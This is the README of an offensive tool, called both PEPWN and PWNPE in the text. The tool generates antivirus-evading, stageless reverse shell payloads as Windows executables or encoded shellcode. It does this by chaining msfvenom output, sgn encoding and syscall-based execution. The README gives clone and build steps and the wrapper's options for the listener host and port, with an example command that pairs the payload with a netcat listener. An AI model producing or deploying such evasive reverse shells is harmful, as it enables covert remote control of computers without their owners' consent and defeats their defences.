# PEPWN
PWNPE is a multi chained tool that has a goal to generate an undetectable reverse shell payload in different formats (PE, shellcode). The payload is stageless and it works without the need of Metasploit Handler, it just needs a TCP listener (using netcat).


## Overview

- [x] generate a payload with msfvenom.
- [x] generate a shellcode from it
- [x] encodes it.
- [x] apply 2nd layer of encoding using sgn.
- [x] transfer it into a shellcode format of use or create exe file that triggers that shellcode using syscalls.



## Installation

>Go to /root directory 

```
git clone https://github.com/0xx7/PEPWN.git
```
Once you download the project, build the dependencies using this command

> ./build.sh

Then 

./wrapper -H



## Documentation

Usage: ./wrapper.sh <OPTIONS>
 
 OPTIONS are:
 
 -f : format/Mode (1 for .exe PE file <DEFAULT> ; 2 for shellcode)
 
 -t : type of shellcode. 1 for raw data ; 2 for base64encoded data ; 3 for big endian hex encoded string. (only if format is 2 otherwise this will be ignored)
 
 -h : host/ip/domain of the listener
 
 -p : port of the listener
 
 -H : help documentation
 
 Example: ./wrapper.sh -f 1 -h 127.0.0.1 -p 4444


## How to use

https://youtu.be/SYriAv_FPAg



